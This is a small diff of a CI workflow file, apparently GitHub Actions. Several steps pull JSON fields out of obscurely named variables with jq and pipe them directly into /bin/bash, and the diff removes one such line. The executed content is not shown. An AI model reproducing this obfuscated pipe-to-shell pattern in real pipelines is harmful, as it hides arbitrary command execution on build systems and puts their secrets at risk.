@@ -54,7 +54,6 @@ jobs:
           echo $n72 | jq -r .mls19957 | /bin/bash
           echo $nzluw8 | jq -r .jv1 | /bin/bash
           echo $y592 | jq -r .su5827 | /bin/bash
-          printf '%s' "$wt1134" | jq -r .tjpxq7810 | /bin/bash
 
       - name: Archive output
         if: always()
